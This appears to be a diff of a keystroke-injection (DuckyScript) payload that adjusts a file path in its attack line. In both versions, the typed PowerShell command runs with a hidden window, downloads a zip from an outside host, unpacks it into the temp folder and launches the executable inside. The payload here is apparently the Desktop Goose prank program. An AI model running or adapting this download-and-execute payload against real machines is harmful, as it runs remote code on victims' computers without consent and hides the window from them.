@@ -13,5 +13,5 @@ DELAY 500
 STRING powershell
 ENTER
 DELAY 2000
-STRING powershell -w h ($Z="$env:TMP"+'\dg.zip');$D="$env:TMP"+'\dg';curl https://f.tuculito.com/file/126adfa2/DesktopGoose.zip -O $Z;Expand-Archive $Z -DestinationPath $D\ -Force;$file="$env:TMP"+'\dg\GooseDesktop.exe';$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+STRING powershell -w h ($Z="$env:TMP"+'\dg.zip');$D="$env:TMP"+'\dg';curl https://f.tuculito.com/file/126adfa2/DesktopGoose.zip -O $Z;Expand-Archive $Z -DestinationPath $D\ -Force;$file="$env:TMP"+'\dg\DesktopGoose v0.3\GooseDesktop.exe';$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 ENTER
